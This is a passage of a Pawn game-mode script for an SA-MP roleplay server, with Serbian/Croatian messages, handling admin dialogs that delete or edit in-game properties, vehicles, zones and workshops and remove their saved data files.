				SPD( playerid, dialog_IMDELETE, DSI, D_NASLOV, "Unesite id imovine koju zelite obrisati!", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 3 ) {
                if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
				new i = GetNearestContainer( playerid );
				
				if( IsValidDynamicObject( KontInfo[ i ][ koObjID ] ) )
					DestroyDynamicObject( KontInfo[ i ][ koObjID ] );

                if(IsValidDynamic3DTextLabel(KontLabel[i]))
                    DestroyDynamic3DTextLabel(KontLabel[i]);

		    	KontInfo[ i ][ koObjPos ][ 0 ] = 0;
    			KontInfo[ i ][ koObjPos ][ 1 ] = 0;
    			KontInfo[ i ][ koObjPos ][ 2 ] = 0;
    			KontInfo[ i ][ koObjRot ][ 0 ] = 0;
    			KontInfo[ i ][ koObjRot ][ 1 ] = 0;
    			KontInfo[ i ][ koObjRot ][ 2 ] = 0;

    			new fstring[ 64 ];
				format( fstring, sizeof( fstring ), KO_FILE, i );
			    if( fexist( fstring ) ) { fremove( fstring ); }

	            SendInfoMessage( playerid, "Obrisao si kontejner. ID = %d.", i );
			}
			if( listitem == 4 ) {
    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
    			if(!PrivatnoVozilo(GetPlayerVehicleID(playerid))) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u privatnom vozilu." );

                new autoid = getVehicleScriptID(GetPlayerVehicleID( playerid ) );

			    Novi_DestroyVehicle( VehicleInfo[ autoid ][ vID ] );
				ResetVehicle( autoid );
				ObrisiVozilo( autoid );

				SendInfoMessage( playerid, "Obrisao si vozilo. ID = %d.", autoid );
			}
			if( listitem == 5 ) {
                if( GetNearestAtm( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu bankomata." );
				new i = GetNearestAtm( playerid );
				
				if( IsValidDynamicObject( atmInfo[ i ][ atmObject ] ) )
					DestroyDynamicObject( atmInfo[ i ][ atmObject ] );

                if( IsValidDynamic3DTextLabel( atmInfo[ i ][ atmText3D ] ) ) DestroyDynamic3DTextLabel( atmInfo[ i ][ atmText3D ] );

		    	atmInfo[ i ][ atmPos ][ 0 ] = 0;
    			atmInfo[ i ][ atmPos ][ 1 ] = 0;
    			atmInfo[ i ][ atmPos ][ 2 ] = 0;
    			atmInfo[ i ][ atmPos ][ 3 ] = 0;
    			atmInfo[ i ][ atmPos ][ 4 ] = 0;
    			atmInfo[ i ][ atmPos ][ 5 ] = 0;
    			atmInfo[ i ][ atmPreseceneZice ] = false;
    			atmInfo[ i ][ atmProbijenBios ] = false;
    			atmInfo[ i ][ atmVremeDoRoba ] = 0;
    			atmInfo[ i ][ atmExists ] = false;

    			new fstring[ 64 ];
				format( fstring, sizeof( fstring ), ATM_FILE, i );
			    if( fexist( fstring ) ) { fremove( fstring ); }

	            SendInfoMessage( playerid, "Obrisao si bankomat. ID = %d.", i );
			}
			if( listitem == 6 ) {
			    new as = GetNearestSalon( playerid );
            	if( as == -1 ) return SendErrorMessage( playerid, "Moras biti pored pickupa za kupnju u salonu." );
            	    
			 //    Novi_DestroyVehicle( VehicleInfo[ slotid ][ vID ] );
    //         	ResetVehicle( slotid );
				// ObrisiVozilo( slotid );

            	if( IsValidDynamic3DTextLabel( AutoSalon[ as ][ AutoSalon3D ] ) )
		    		DestroyDynamic3DTextLabel( AutoSalon[ as ][ AutoSalon3D ] );

		    	if( IsValidDynamicPickup( AutoSalon[ as ][ AutoSalonPickup ] ) )
					DestroyDynamicPickup( AutoSalon[ as ][ AutoSalonPickup ] );

				AutoSalon[ as ][ aPickupPos ][ 0 ] = 0.0;
				AutoSalon[ as ][ aPickupPos ][ 1 ] = 0.0;
				AutoSalon[ as ][ aPickupPos ][ 2 ] = 0.0;
				AutoSalon[ as ][ aVW ] = 0;
				AutoSalon[ as ][ aInt ] = 0;
				AutoSalon[ as ][ aVehBuyedPos ][ 0 ] = 0.0; AutoSalon[ as ][ aVehBuyedPos ][ 1 ] = 0.0; AutoSalon[ as ][ aVehBuyedPos ][ 2 ] = 0.0; AutoSalon[ as ][ aVehBuyedPos ][ 3 ] = 0.0;
				AutoSalon[ as ][ aCameraPos ][ 0 ] = 0.0; AutoSalon[ as ][ aCameraPos ][ 1 ] = 0.0; AutoSalon[ as ][ aCameraPos ][ 2 ] = 0.0;
				AutoSalon[ as ][ aCameraLookAt ][ 0 ] = 0.0; AutoSalon[ as ][ aCameraLookAt ][ 1 ] = 0.0; AutoSalon[ as ][ aCameraLookAt ][ 2 ] = 0.0;
				AutoSalon[ as ][ aVehModel ][ 0 ] = 0; AutoSalon[ as ][ aMaxVehModel ] = 0;
				AutoSalon[ as ][ aVehModel ][ 1 ] = 0; AutoSalon[ as ][ aVehModel ][ 2 ] = 0; AutoSalon[ as ][ aVehModel ][ 3 ] = 0;
				AutoSalon[ as ][ aVehModel ][ 4 ] = 0; AutoSalon[ as ][ aVehModel ][ 5 ] = 0; AutoSalon[ as ][ aVehModel ][ 6 ] = 0;
				AutoSalon[ as ][ aVehModel ][ 7 ] = 0; AutoSalon[ as ][ aVehModel ][ 8 ] = 0; AutoSalon[ as ][ aVehModel ][ 9 ] = 0;
                AutoSalon[ as ][ aVehModel ][ 10 ] = 0; AutoSalon[ as ][ aVehModel ][ 11 ] = 0; AutoSalon[ as ][ aVehModel ][ 12 ] = 0;
				AutoSalon[ as ][ aVehModel ][ 13 ] = 0; AutoSalon[ as ][ aVehModel ][ 14 ] = 0; AutoSalon[ as ][ aVehModel ][ 15 ] = 0;

			    new asFile[ 50 ];
	    		format( asFile, sizeof( asFile ), AS_FILE, as );
	    		if( fexist( asFile ) ) { fremove( asFile ); }

	    		SendInfoMessage( playerid, "Obrisao si autosalon. ID = %d.", as );
			}
			if( listitem == 7 ) {
			    new string[ 15 ],
						portid = GetNearestOrgPortID( playerid ),
			    			orgid = GetNearestOrgIDPort( playerid );

			    if( portid == -1 || orgid == -1 ) return SendErrorMessage( playerid, "U blizini nema organizacijskih portova" );

				if( IsValidDynamicPickup( PortOP[ orgid ][ portid ][ Pickup ][ 0 ] ) )
					DestroyDynamicPickup( PortOP[ orgid ][ portid ][ Pickup ][ 0 ] );

                if( IsValidDynamicPickup( PortOP[ orgid ][ portid ][ Pickup ][ 1 ] ) )
					DestroyDynamicPickup( PortOP[ orgid ][ portid ][ Pickup ][ 1 ] );

                if( IsValidDynamic3DTextLabel(PortOP[orgid][portid][Label][0]))
                    DestroyDynamic3DTextLabel(PortOP[orgid][portid][Label][0]);

                if( IsValidDynamic3DTextLabel(PortOP[orgid][portid][Label][1]))
                    DestroyDynamic3DTextLabel(PortOP[orgid][portid][Label][1]);

				PortOP[ orgid ][ portid ][ Pos1 ][ 0 ] = 0.0;
				PortOP[ orgid ][ portid ][ Pos1 ][ 1 ] = 0.0;
				PortOP[ orgid ][ portid ][ Pos1 ][ 2 ] = 0.0;
				PortOP[ orgid ][ portid ][ Int ][ 0 ] = 0;
				PortOP[ orgid ][ portid ][ VW ][ 0 ] = 0;
				PortOP[ orgid ][ portid ][ Pos2 ][ 0 ] = 0.0;
				PortOP[ orgid ][ portid ][ Pos2 ][ 1 ] = 0.0;
				PortOP[ orgid ][ portid ][ Pos2 ][ 2 ] = 0.0;
				PortOP[ orgid ][ portid ][ Int ][ 1 ] = 0;
				PortOP[ orgid ][ portid ][ VW ][ 1 ] = 0;

				new pFile[ 40 ];
		        format( pFile, sizeof( pFile ), PORT_FILE, orgid );
		        new INI:File = INI_Open( pFile );

				format( string, sizeof( string ), "Pos1X%d", portid );
				INI_WriteFloat( File, string, 0.0);

				format( string, sizeof( string ), "Pos1Y%d", portid );
				INI_WriteFloat( File, string, 0.0 );

				format( string, sizeof( string ), "Pos1Z%d", portid );
				INI_WriteFloat( File, string, 0.0 );

				format( string, sizeof( string ), "Int1%d", portid );
				INI_WriteInt( File, string, 0 );

				format( string, sizeof( string ), "VW1%d", portid );
				INI_WriteInt( File, string, 0 );

		        format( string, sizeof( string ), "Pos2X%d", portid );
				INI_WriteFloat( File, string, 0.0 );

				format( string, sizeof( string ), "Pos2Y%d", portid );
				INI_WriteFloat( File, string, 0.0 );

				format( string, sizeof( string ), "Pos2Z%d", portid );
				INI_WriteFloat( File, string, 0.0 );

				format( string, sizeof( string ), "Int2%d", portid );
				INI_WriteInt( File, string, 0 );

				format( string, sizeof( string ), "VW2%d", portid );
				INI_WriteInt( File, string, 0 );

				INI_Close( File );

				SendInfoMessage( playerid, "Obrisao si port za orgu. ID = %d.", orgid );
			}
			if( listitem == 8 ) {
                if( GetNearestHotel( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu hotela." );
				new h = GetNearestHotel( playerid );

				if( IsValidDynamicPickup( hotelInfo[ h ][ hPickup ] ) )
					DestroyDynamicPickup( hotelInfo[ h ][ hPickup ] );

				if( IsValidDynamic3DTextLabel( hotelInfo[ h ][ h3DText ] ) )
					DestroyDynamic3DTextLabel( hotelInfo[ h ][ h3DText ] );

    			new fstring[ 64 ];
				format( fstring, sizeof( fstring ), HOTEL_FILE, h );
			    if( fexist( fstring ) ) { fremove( fstring ); }

	            SendInfoMessage( playerid, "Obrisao si hotel. ID = %d.", h );
			}
			if( listitem == 9 ) {
			
                if( NearestGate( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti pored kapije." );
				new g = NearestGate( playerid );
				
				if( IsValidDynamicObject( GateData[ g ][ gateObject ] ) )
					DestroyDynamicObject( GateData[ g ][ gateObject ] );
					
				new fstring[ 64 ];
				format( fstring, sizeof( fstring ), GATE_FILE, g );
			    if( fexist( fstring ) ) { fremove( fstring ); }
			    
			    SendInfoMessage( playerid, "Obrisao si kapiju. ID = %d.", g );
			}
			if( listitem == 10 ) {
                SendErrorMessage(playerid, "Iskljuceno!");
			}
			if( listitem == 11 ) {
                if( GetNearestGarage( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu garaze." );
				new id = GetNearestGarage( playerid );

				if( IsValidDynamicPickup( garageInfo[ id ][ garagePickup ] ) )
					DestroyDynamicPickup( garageInfo[ id ][ garagePickup ] );

				if( IsValidDynamic3DTextLabel( garageInfo[ id ][ garage3D ] ) )
					DestroyDynamic3DTextLabel( garageInfo[ id ][ garage3D ] );

                ResetGarage( id );

    			new fstring[ 64 ];
				format( fstring, sizeof( fstring ), F_GARAGE, id );
			    if( fexist( fstring ) ) { fremove( fstring ); }

	            SendInfoMessage( playerid, "Obrisao si garazu. ID = %d.", id );
			}
			if( listitem == 12 ) {
			
			    if( GetNearestRadar( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu radara." );
				new id = GetNearestRadar( playerid );

				if( IsValidDynamicObject( radarInfo[ id ][ radarObject ] ) )
					DestroyDynamicObject( radarInfo[ id ][ radarObject ] );

				radarInfo[ id ][ radarMaxSpeed ] = 0;
				radarInfo[ id ][ radarPrice ] = 0;
				radarInfo[ id ][ radarPos ][ 0 ] = 0;
				radarInfo[ id ][ radarPos ][ 1 ] = 0;
				radarInfo[ id ][ radarPos ][ 2 ] = 0;
				radarInfo[ id ][ radarPos ][ 3 ] = 0;
				radarInfo[ id ][ radarPos ][ 4 ] = 0;
				radarInfo[ id ][ radarPos ][ 5 ] = 0;

    			new fstring[ 64 ];
				format( fstring, sizeof( fstring ), F_RADARS, id );
			    if( fexist( fstring ) ) { fremove( fstring ); }

	            SendInfoMessage( playerid, "Obrisao si radar. ID = %d.", id );
			}
			if( listitem == 13 ) {
			
			    if( GetNearestGZone( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti u teritoriji." );
				new id = GetNearestGZone( playerid );

				if( IsValidDynamicPickup( gZoneInfo[ id ][ gZonePickup ] ) )
					DestroyDynamicPickup( gZoneInfo[ id ][ gZonePickup ] );
			
			    if( IsValidDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] ) )
		    		DestroyDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] );
		    		
                if( IsValidDynamicArea( gZoneInfo[ id ][ gZoneRectAngle ] ) )
                    DestroyDynamicArea(gZoneInfo[ id ][ gZoneRectAngle ]);
		    	
			    GZone_Reset( id );
			
			    GangZoneHideForAll( gZoneInfo[ id ][ gZoneID ] );
			    GangZoneDestroy( gZoneInfo[ id ][ gZoneID ] );
			    
			    new fstring[ 64 ];
				format( fstring, sizeof( fstring ), F_GZONE, id );
			    if( fexist( fstring ) ) { fremove( fstring ); }
			    
			    SendInfoMessage( playerid, "Obrisao si gangzonu. ID = %d.", id );
			}
			if( listitem == 14) {
				for(new rent=0; rent < MAX_RENTL; rent++)
				{
					if(IsPlayerInRangeOfPoint(playerid, 3.0, RentInfo[rent][rPosX], RentInfo[rent][rPosY], RentInfo[rent][rPosZ]))
					{
						new fFile[50];
						format(fFile, 50, RENTLOCATION_FILE, rent);
					    if(fexist(fFile))
					    {
					        fremove(fFile);

                            if(IsValidDynamic3DTextLabel(RentLabel[rent]))
                                DestroyDynamic3DTextLabel(RentLabel[rent]);

                            if(IsValidDynamicPickup(RentPickup[rent]))
                                DestroyDynamicPickup(RentPickup[rent]);

					        SendInfoMessage(playerid, "Rent Lokacije uspesno obrisana!");
					    }
					}
				}
			}
            if(listitem == 15) {

                ShowPlayerDialog(playerid, dialog_ActorIzbrisi, DSI, D_NASLOV, "Unesite ID actora", "Potvrdi", "Odustani");
            }
            if(listitem == 16) {

                for(new plant=0; plant < MAX_PLANTAZA; plant++){

                    if(IsPlayerInRangeOfPoint(playerid, 3.0, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ])) {

                        new drogaFile[40];
                        format(drogaFile, 40, PLANTAZE_FILE, plant);
                        fremove(drogaFile);
                        DestroyDynamic3DTextLabel(PlantazaLabel[plant]);
                        SendInfoMessage(playerid, "Plantaza ID: %d uspesno obrisana!", plant);
                    }
                }
                return SendErrorMessage(playerid, "Nisi blizu nijedne plantaze!");
            }

            if(listitem == 17) {

                for(new id=0; id < MAX_BTCW; id++){

                    if(IsPlayerInRangeOfPoint(playerid, 3.0, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ])) {

                        new drogaFile[40];
                        format(drogaFile, 40, BITCOIN_FILE, id);
                        fremove(drogaFile);
                       
                        DestroyDynamic3DTextLabel(BitCoinLabel[id]);
                        DestroyDynamicPickup(BitCoinPickup[id]);
                        DestroyDynamic3DTextLabel(BitCoinSafeLabel[id]);

                        SendInfoMessage(playerid, "BitCoin WorkShop ID %d uspesno obrisan!", id);

                        return 1;
                    }
                }
                return SendErrorMessage(playerid, "Nisi blizu nijednog BitCoin WorkShop-a!");
            }
            if(listitem == 18) {

                new id = NajbliziIDOrgVeh(playerid);
                if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

                new fFile[50];
                format(fFile, 50, ORGVEH_FILE, id);
                if(fexist(fFile))
                {
                    fremove(fFile);
                    DestroyDynamic3DTextLabel(OrgVehLabel[id]);
                    DestroyDynamicPickup(OrgVehPickup[id]);
                    SendInfoMessage(playerid, "Org Veh Pickup je uspesno obrisan!");

                    return 1;
                }
                return 1;
            }
            if(listitem == 19) {

                new id = GetNearestWorkShop( playerid );
                if( id == -1 ) return SendErrorMessage( playerid, "U blizini nema nijedna radionica." );
                new fFile[50];
                format(fFile, 50, WorkShop_File, id);
                if(fexist(fFile))
                {
                    fremove(fFile);
                    DestroyDynamic3DTextLabel(WorkShopLabel[id]);
                    DestroyDynamicPickup(WorkShopPickup[id]);
                    SendInfoMessage(playerid, "Radionica je uspesno obrisana!");
                }
                    
            }
            if(listitem == 20) {

                for(new id=0; id < sizeof(NargilaInfo); id++)
                {
                    if(IsPlayerInRangeOfPoint(playerid, 3.0, NargilaInfo[id][nargilaPosX], NargilaInfo[id][nargilaPosY], NargilaInfo[id][nargilaPosZ]))
                    {
                        new fFile[50];
                        format(fFile, 50, "/Nargile/%d.ini", id);
                        if(fexist(fFile))
                        {
                            if(IsValidDynamicObject(NargilaInfo[id][nargilaID]))
                                DestroyDynamicObject(NargilaInfo[id][nargilaID]);

                            fremove(fFile);

                            Delete3DTextLabel(NargilaLabel[id]);
                            SendInfoMessage(playerid, "Nargila je uspesno obrisana!");
                        }
                    }
                    else return SendErrorMessage(playerid, "Nisi blizu nijedne nargile!");
                }
            }
            if(listitem == 21) {

                new portID = GetNearestPort(playerid);
                if(portID == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog porta!");

                new wFile[40], portNaziv[64];
                format(portNaziv, 64, "%s", portInfo[portID][portIme]);
                format(wFile, 40, PORTING_FILE, portID);
                if(fexist(wFile)) {

                    fremove(wFile);
                }
                SendInfoMessage(playerid, "Port %s uspesno obrisan!", portNaziv);
            }
            if(listitem == 22) {

                new id = getNearestSlut(playerid);
                if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijedne kurve!");

                new fFile[50];
                format(fFile, 50, SlutsFile, id);
                if(fexist(fFile)) {

                    fremove(fFile);
                    DestroyDynamic3DTextLabel(slutLabel[id]);
                    DestroyDynamicActor(slutActor[id]);
                    DestroyDynamicMapIcon(slutMapIcon[id]);
                    SendInfoMessage(playerid, "Kurva ID (%d) uspesno obrisana!", id);
                    return 1;
                }
                else return SendErrorMessage(playerid, "Desila se greska! Pozovi skriptera!");
            }
            if(listitem == 23) {

                new id = GetNearestNaftnaPlatforma(playerid);
                if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijedne naftne platforme");

                new drogaFile[40];
                format(drogaFile, 40, PLATFORMA_FILE, id);
                if(fexist(drogaFile)) {
                    fremove(drogaFile);
                   
                    DestroyDynamic3DTextLabel(NaftaLabel[id]);
                    DestroyDynamicPickup(NaftaPickup[id]);

                    SendInfoMessage(playerid, "Naftna Platforma ID %d uspesno obrisan!", id);

                    return 1;
                }
                return SendErrorMessage(playerid, "Desila se greska! Pozovi skriptera!");
            }
		}
	}
    else if(dialogid == dialog_ActorIzbrisi) {

        new ActorID = strval(inputtext);
        new fFile[50];
        format(fFile, 50, ActorsFile, ActorID);
        if(fexist(fFile)) {

            fremove(fFile);
            DestroyDynamic3DTextLabel(ActorLabel[ActorID]);
            DestroyActor(ActorActor[ActorID]);
            SendInfoMessage(playerid, "Actor uspesno obrisan!");
            return 1;
        }
        else return SendErrorMessage(playerid, "Taj actor ne postoji!");
    }
	else if( dialogid == dialog_IZMENISVE ) {
	    if( !response ) return true;
        if( response ) {
		    if( listitem == 0 ) {
		    	SPD( playerid, dialog_ORGEDIT, DSL, D_NASLOV, "Promeni Ime\nPromeni Interior\nPromeni Rankove\nPromeni Tip\nPromeni muske skinove\nPromeni Skracenicu\nNapravi DutyPoint\nNapravi Equipment Point\nNapravi Port point\nPromeni zenske skinove\nPromeni max broj clanova\nOdaberi vrstu droge\nKreiraj sef\nPromeni boju orge\nWar Point\nUnisti Drug Field\nSlaba Tacka", D_ODABERI, D_ODUSTANI ); }
	        if( listitem == 1 ) {
		    	SPD( playerid, dialog_FEDIT, DSL, D_NASLOV, "Promeni Ime\nOtkljucaj firmu\nZakljucaj firmu\nProdaj firmu\nPostavi produkte", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 2 ) {
		    	SPD( playerid, dialog_VEDIT, DSL, D_NASLOV, "Promeni cenu\nParkiraj vozilo\nProdaj vozilo\nPromeni boju", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 3 ) {
		    	SPD( playerid, dialog_IEDIT, DSL, D_NASLOV, "Promeni cenu\nOtkljucaj imovinu\nZakljucaj imovinu\nProdaj imovinu", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 4 ) {
		    	SPD( playerid, dialog_HEDIT, DSL, D_NASLOV, "Promeni cenu\nPromeni level\nProdaj hotel", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 5 ) {
		    	SendErrorMessage(playerid, "Iskljuceno!"); }
            if( listitem == 6 ) {
		    	SPD( playerid, dialog_GEDIT, DSL, D_NASLOV, "Promeni cenu\nPromeni level\nProdaj garazu", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 7 ) {
		    	SPD( playerid, dialog_GPSEDIT, DSL, D_NASLOV, "Promeni ime\nPromeni poziciju", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 8 ) {
		    	SPD( playerid, dialog_APORTEDIT, DSL, D_NASLOV, "Promeni ime\nPromeni poziciju", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 9 ) {
		    	SPD( playerid, dialog_SPORTEDIT, DSL, D_NASLOV, "Promeni ime\nPromeni poziciju", D_ODABERI, D_ODUSTANI ); }
			if( listitem == 10 ) {
		    	SPD( playerid, dialog_AUTOSEDIT, DSL, D_NASLOV, "Dodaj kolicinu modela", D_ODABERI, D_ODUSTANI ); }
            if( listitem == 11 ) {
		    	SPD( playerid, dialog_GANGZEDIT, DSL, D_NASLOV, "Daj vlasnistvo zone bandi\nDa li zona moze da se zauzima?\nOslobodi zonu\nPromeni boju zone\nPromeni Tip Zone", D_ODABERI, D_ODUSTANI ); }
            if(listitem == 12) {
                ShowPlayerDialog(playerid, dialog_OrgVehEdit, DIALOG_STYLE_LIST, "Org Veh Pickup Izmeni", "Promeni vlasnistvo\nPromeni Model\nPromeni kolicinu\nSpawn Point\nPromeni boju vozila", D_ODABERI, D_ODUSTANI );
            }
            if(listitem == 13) {
                ShowPlayerDialog(playerid, dialog_BitcoinEdit, DIALOG_STYLE_LIST,"Bitcoin WorkShop Izmeni", "Prodaj Drzavi", "Potvrdi", "Odustani");
            }
            if(listitem == 14) {
                ShowPlayerDialog(playerid, dialog_RadionicaEdit, DIALOG_STYLE_LIST,"Radionica Izmeni", "Prodaj Drzavi\nPomeri Lokaciju", "Potvrdi", "Odustani");
            }
            if(listitem == 15) {
                ShowPlayerDialog(playerid, dialog_NaftaEdit, DIALOG_STYLE_LIST,"Naftna Platforma Izmeni", "Prodaj Drzavi", "Potvrdi", "Odustani");
            }
		}
	}

    else if(dialogid == dialog_RadionicaEdit && response) {

        if(listitem == 0) {

            new id = GetNearestWorkShop( playerid );

            if( id == -1 ) return SendErrorMessage( playerid, "U blizini nema nijedna radionica." );
            if(!strcmp( WorkShopInfo[id][wVlasnik], "Niko", true )) return SendErrorMessage(playerid, "Ova radionica nema vlasnika!");

            WorkShopInfo[id][wBrojAuta] = 0;
            WorkShopInfo[id][wBrojDelova] = 0;

            WorkShopInfo[id][wModel1] = 0;
            WorkShopInfo[id][wModel2] = 0;
            WorkShopInfo[id][wPopravka1] = 0;
            WorkShopInfo[id][wPopravka2] = 0;

            WorkShopInfo[id][wBrojRadnika] = 0;

            strmid( WorkShopInfo[id][wVlasnik], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );

            SaveWorkShop(id);

            WorkShopVehicleCheck(id);

            WorkShopLabelUpdate(id);

            foreach(Player, i) {

                if(PlayerInfo[i][xWorkShopGarage] == id) {

                    PlayerInfo[i][xWorkShopGarage] = -1;
                    SavePlayer(i);
                    SendInfoMessage(i, "Admin je prodao tvoju radionicu!");
                }
            }

            SendInfoMessage(playerid, "Uspesno si prodao WorkShop!");

            return 1;
        }
        if(listitem == 1) {

            new id = GetNearestWorkShop( playerid );

            if( id == -1 ) return SendErrorMessage( playerid, "U blizini nema nijedna radionica." );

            new Float:Poss[3];
            GetPlayerPos(playerid, Poss[0], Poss[1], Poss[2]);

            WorkShopInfo[id][wPosX] = Poss[0];
            WorkShopInfo[id][wPosY] = Poss[1];
            WorkShopInfo[id][wPosZ] = Poss[2];

            SaveWorkShop(id);

            WorkShopVehicleCheck(id);

            WorkShopLabelUpdate(id);

            SendInfoMessage(playerid, "Uspesno si pomerio WorkShop!");

            return 1;
        }

        return 1;
    }

    else if(dialogid == dialog_BitcoinEdit && response) {

        if(listitem == 0) {

            new id = GetNearestBtcWorkShop(playerid);
            if(id == -1) return SendErrorMessage(playerid, "U blizini nema nijedan Bitcoin Workshop!");

            if(!strcmp( BitcoinInfo[id][bVlasnik], "Niko", true )) return SendErrorMessage(playerid, "Ovaj Bitcoin Workshop nema vlasnika!");

            strmid(BitcoinInfo[id][bVlasnik],"Niko",0,strlen("Niko"),255);
            BitcoinInfo[id][bNovac] = 0;
            BitcoinInfo[id][bMasine] = 1;
            BitcoinInfo[id][bIzlazX] = 2318.5020;
            BitcoinInfo[id][bIzlazY] = -1786.4697;
            BitcoinInfo[id][bIzlazZ] = 1600.7520;
            BitcoinInfo[id][bPokvareno] = 0;
            SacuvajBTCWorkShop(id);

            if(IsValidDynamic3DTextLabel(BitCoinLabel[id]))
                DestroyDynamic3DTextLabel(BitCoinLabel[id]);

            if(IsValidDynamicPickup(BitCoinPickup[id]))
                DestroyDynamicPickup(BitCoinPickup[id]);

            new string[220];
            format(string, 220, ""SRVBOJA1SCM"[ BitCoin WorkShop ]\nVlasnik : "col_white"NIKO\n"SRVBOJA1SCM"ID: "col_white"%d\n"SRVBOJA1SCM"Cena: "col_white"%d$\n"SRVBOJA1SCM"Da kupis bitcoin workshop koristi /kupiworkshop", id, BTCWORKSHOP_PRICE);
            BitCoinLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
            BitCoinPickup[id] = CreateDynamicPickup(18631, 1, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

            foreach(Player, i) {

                if(PlayerInfo[i][xWorkShopID] == id) {

                    PlayerInfo[i][xWorkShopID] = -1;
                    SavePlayer(i);
                    SendInfoMessage(i, "Admin je prodao tvoj bitcoin workshop!");
                }
            }

            SendInfoMessage(playerid, "Uspesno si prodao bitcoin workshop!");

            return 1;
        }

        return 1;
    }

    else if(dialogid == dialog_OrgVehEdit) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: {

                    new id = NajbliziIDOrgVeh(playerid);
                    if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

                    ShowPlayerDialog(playerid, dialog_OrgVehEditOwner, DIALOG_STYLE_INPUT, "Promena Vlasnistva", "Unesite ID organizacije koja ce biti novi vlasnik", "Potvrdi", "Odustani");

                    return 1;
                }
                case 1: {

                    new id = NajbliziIDOrgVeh(playerid);
                    if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

                    new VehString[2048];
                    new string[64];

                    format(string, sizeof(string), ""SRVBOJA1SCM"1) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel1] - 400], OrgVehInfo[id][oVehKolicina1]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"2) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel2] - 400], OrgVehInfo[id][oVehKolicina2]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"3) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel3] - 400], OrgVehInfo[id][oVehKolicina3]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"4) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel4] - 400], OrgVehInfo[id][oVehKolicina4]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"5) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel5] - 400], OrgVehInfo[id][oVehKolicina5]);
                    strcat(VehString, string);

                    ShowPlayerDialog(playerid, dialog_OrgVehEditModel, DIALOG_STYLE_LIST, "Org Veh Edit Model", VehString, "Potvrdi", "Odustani");

                    return 1;
                }
                case 2: {

                    new id = NajbliziIDOrgVeh(playerid);
                    if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog Org Veh Pickup-a!");

                    new VehString[2048];
                    new string[64];

                    format(string, sizeof(string), ""SRVBOJA1SCM"1) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel1] - 400], OrgVehInfo[id][oVehKolicina1]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"2) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel2] - 400], OrgVehInfo[id][oVehKolicina2]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"3) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel3] - 400], OrgVehInfo[id][oVehKolicina3]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"4) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel4] - 400], OrgVehInfo[id][oVehKolicina4]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"5) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[id][oVehModel5] - 400], OrgVehInfo[id][oVehKolicina5]);
                    strcat(VehString, string);

